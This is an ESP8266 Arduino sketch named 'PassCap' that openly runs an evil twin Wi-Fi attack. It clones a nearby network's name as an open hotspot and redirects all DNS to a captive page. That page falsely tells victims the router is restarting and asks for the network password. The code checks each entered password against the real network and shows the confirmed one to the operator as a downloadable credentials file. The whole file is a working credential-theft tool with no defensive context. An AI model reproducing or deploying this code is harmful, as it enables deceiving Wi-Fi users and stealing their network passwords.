/*
 * PassCap
 * It captures the wifi password by using evil twin attack.
 * Author - WireBits
 */

#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 6, 1);
IPAddress subnet_mask(255, 255, 255, 0);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

const char *ssid = "PassCap";
const char *password = "wpasscap";

typedef struct
{
  String ssid;
  uint8_t channel_no;
  uint8_t bssid[6];
} main_network;

main_network networks[16];
main_network selected_network;

void ClearArrayForNetworks()
{
  for(int i=0; i<16; i++)
  {
    main_network network;
    networks[i] = network;
  }
}

String correct_password = "";
String try_password = "";

String header(String MainPhisPage)
{
  String NetworkName = String(selected_network.ssid);
  String PhisPageBody = "<!DOCTYPE html>"
                        "<html>"
                        "<head>"
                        "<title>"+NetworkName+" : "+MainPhisPage+"</title>"
                        "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                        "<style>"
                        "article{background: #f2f2f2; padding: 1.3em;}"
                        "body{color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0;}"
                        "div{padding: 0.5em;}"
                        "h1{margin: 0.5em 0 0 0; padding: 0.5em;}"
                        "input{width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555;}"
                        "label{color: #333; display: block; font-style: italic; font-weight: bold;}"
                        "nav{background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em;}"
                        "nav b{display: block; font-size: 1.5em; margin-bottom: 0.5em;}"
                        "textarea{width: 100%;}"
                        "</style>"
                        "</head>"
                        "<body>"
                        "<nav><b>"+NetworkName+"</b>Validation Panel</nav>"
                        "<div><h1>"+MainPhisPage+"</h1></div>"
                        "</body>"
                        "</html>";
  return PhisPageBody;
}

String index()
{
  String pass_field = header("Sign In");
        pass_field += "<div>";
        pass_field += "Due to internal problems router is being restarted. Enter password to re-connect to the network.";
        pass_field += "</div>";
        pass_field += "<div>";
        pass_field += "<form action='/'>";
        pass_field += "<b>Password:</b>";
        pass_field += "<center>";
        pass_field += "<input type=password name=password>";
        pass_field += "<input type=submit value=\"Sign in\">";
        pass_field += "</center>";
        pass_field += "</form>";
        pass_field += "</div><div class=q><center>&#169; All rights reserved.</center></div>";
 return pass_field;
}

String posted()
{
 return header("Validating")+"Your account is being validated. Please, wait up to 2 minute for device connection.</br>Thank you."+"<script>setTimeout(function(){window.location.href = '/result';},15000);</script></div><div class=q><center>&#169; All rights reserved.</center></div>";
}

void performScan()
{
  int n = WiFi.scanNetworks();
  ClearArrayForNetworks();
  if (n>=0) 
  {
    for (int i=0; i<n && i<16; ++i)
  {
      main_network network;
      network.ssid = WiFi.SSID(i);
      for (int j=0; j<6; j++)
    {
       network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.channel_no = WiFi.channel(i);
      networks[i] = network;
    }
  }
}

bool hotspot_active = false;

void handleResult()
{
 String html = "";
 if (WiFi.status() != WL_CONNECTED)
 {
  webServer.send(200,"text/html","<html><head><script>setTimeout(function(){window.location.href = '/';},3000);</script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Wrong Password!</h2><p>Please try again!</p></body></html>");
  WPassBlink();
 }
 else 
 {
  hotspot_active = false;
  dnsServer.stop();
  int n = WiFi.softAPdisconnect(true);
  WiFi.softAPConfig(apIP, apIP, subnet_mask);
  WiFi.softAP(ssid, password);
  dnsServer.start(53, "*", apIP);
  correct_password = "Successfully got password for : " + selected_network.ssid + "<br>Password : " + try_password;
  RPassBlink();
 }
}

String main_page = "<html>"
                   "<head>"
                   "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<title>PassCap</title>"
                   "<style>"
                   "body{background-color: #000000;display: flex;justify-content: center;align-items: center;height: 100vh;margin: 0;color: white;font-family: sans-serif;margin: 0;}"
                   ".content{font-size: 1.5rem;margin-bottom: 1rem;color: white;position: center;top: 85px;left: 50%;background-color: #000000;color: white;}"
                   "table{border-collapse: collapse;}"
                   "th,td{padding: 10px 6px;text-align: center;border-style:solid;border-color: #87CEEB;}"
                   "button{background-color: #232023;display: inline-block;height: 38px;padding: 0 20px;color:white;text-align: center;font-size: 11px;font-weight: 600;line-height: 38px;letter-spacing: .1rem;text-transform: uppercase;text-decoration: none;white-space: nowrap;background: #2f3136;border-radius: 4px;border: none;cursor: pointer;box-sizing: border-box;}"
                   "button:hover{background: #42444a;}"
                   "h1{font-size: 1.7rem;margin-top: 1rem;background: #2f3136;color: #bfbfbb;padding: 0.2em 1em;border-radius: 3px;border-left: solid #20c20e 5px;font-weight: 100;}"
                   "</style>"
                   "</head>"
                   "<body>"
                   "<center>"
                   "<div class='content'>"
                   "<h1 style=\"font-size: 1.4rem;margin-top: 1rem;padding: 10px;border: 2px solid orange;font-weight: 100;letter-spacing: 5px;background-color: #000000;color: white;\">PassCap</h1>"
                   "</div>"
                   "<table>"
                   "<tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";
                 
String button_data = "<form style='display:inline-block; padding-left:8px;align:center;' method='post' action='/?hotspot={hotspot}'>"
                     "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>";

void handleIndex()
{
 if (webServer.hasArg("ap")) 
 {
  for (int i = 0; i < 16; i++)
  {
   if (bytesToStr(networks[i].bssid, 6) == webServer.arg("ap"))
   {
    selected_network = networks[i];
   }
  }
 }
 if (webServer.hasArg("hotspot"))
 {
  if (webServer.arg("hotspot") == "start") 
  {
   hotspot_active = true;
   dnsServer.stop();
   int n = WiFi.softAPdisconnect(true);
   WiFi.softAPConfig(apIP, apIP, subnet_mask);
   WiFi.softAP(selected_network.ssid.c_str());
   dnsServer.start(53, "*", apIP);
  } 
  else if (webServer.arg("hotspot") == "stop") 
  {
   hotspot_active = false;
   dnsServer.stop();
   int n = WiFi.softAPdisconnect (true);
   WiFi.softAPConfig(apIP, apIP, subnet_mask);
   WiFi.softAP(ssid, password);
   dnsServer.start(53, "*", apIP);
  }
  return;
 }
 if (hotspot_active == false)
 {
  String html_data = main_page;
  for (int i=0; i<16; ++i) 
  {
   if (networks[i].ssid == "") 
   {
    break;
   }
   html_data += "<tr><td>" + networks[i].ssid + "</td><td>" + bytesToStr(networks[i].bssid, 6) + "</td><td>" + String(networks[i].channel_no) + "<td><form method='post' action='/?ap=" + bytesToStr(networks[i].bssid, 6) + "'>";
   if (bytesToStr(selected_network.bssid, 6) == bytesToStr(networks[i].bssid, 6))
   {
    html_data += "<button style='background-color: #20c20e; color:black;'>Selected</button></form></td></tr>";
   } 
   else 
   {
    html_data += "<button>Select</button></form></td></tr>";
   }
  }
  if (hotspot_active) 
  {
   button_data.replace("{hotspot_button}", "Stop Capture");
   button_data.replace("{hotspot}", "stop");
  }
  else 
  {
   button_data.replace("{hotspot_button}", "Start Capture");
   button_data.replace("{hotspot}", "start");
  }
  if(selected_network.ssid == "") 
  {
   html_data.replace("{disabled}", " disabled");
  }
  else
  {
   html_data.replace("{disabled}", "");
  }
  html_data += "</table><br>"+button_data;
  if (correct_password != "")
  {
   html_data += "<h1>Results</h1><h3>" + correct_password + "</h3><hr>";
   html_data += "<script>";
   html_data += "function downloadPassword() {";
   html_data += " const ssid = '" + selected_network.ssid + "';";
   html_data += " const password = '" + try_password + "';";
   html_data += " const content = 'SSID: ' + ssid + '\\nPassword: ' + password;";
   html_data += " const blob = new Blob([content], { type: 'text/plain' });";
   html_data += " const link = document.createElement('a');";
   html_data += " link.href = URL.createObjectURL(blob);";
   html_data += " link.download = 'credentials.txt';";
   html_data += " document.body.appendChild(link);";
   html_data += " link.click();";
   html_data += " document.body.removeChild(link);";
   html_data += "}";
   html_data += "</script>";
   html_data += "<button onclick=\"downloadPassword()\">Download Credentials</button>";
  }
  html_data += "</div></center></body></html>";
  webServer.send(200, "text/html", html_data);
 }
 else
 {
  if (webServer.hasArg("password"))
  {
  try_password = webServer.arg("password");
  WiFi.disconnect();
  WiFi.begin(selected_network.ssid.c_str(), webServer.arg("password").c_str(), selected_network.channel_no, selected_network.bssid);
  webServer.send(200, "text/html", posted());
  }
  else
  {
   webServer.send(200, "text/html", index());
  }
 }
}

String bytesToStr(const uint8_t* b, uint32_t size)
{
 String str;
 const char ZERO = '0';
 const char DOUBLEPOINT = ':';
 for (uint32_t i = 0; i < size; i++)
 {
  if (b[i] < 0x10) str += ZERO;
  str += String(b[i], HEX);
  if (i < size - 1) str += DOUBLEPOINT;
 }
 return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long attack_now = 0;

void RPassBlink()
{
 for (int counter = 0;counter < 6;counter++)
 {
  digitalWrite(2, counter % 2);
  delay(500);
 }
}

void WPassBlink()
{
 for (int counter = 0;counter < 4;counter++)
 {
  digitalWrite(2, counter % 2);
  delay(500);
 }
}

void setup()
{
  pinMode(2, OUTPUT);
  digitalWrite(2, HIGH);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(apIP, apIP, subnet_mask);
  WiFi.softAP(ssid, password);
  dnsServer.start(53, "*", apIP);
  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}

void loop()
{
  dnsServer.processNextRequest();
 webServer.handleClient();
 if (hotspot_active && millis() - attack_now >= 1000) 
 {
  wifi_set_channel(selected_network.channel_no);
  attack_now = millis();
 }
 if (millis() - now >= 15000)
 {
  performScan();
  now = millis();
 }
 if (millis() - wifinow >= 2000)
 {
  if (WiFi.status() != WL_CONNECTED)
  {
   Serial.println("Connect Again!");
  }
  else
  {
   Serial.println("Ready to go!");
  }
  wifinow = millis();
 }
}
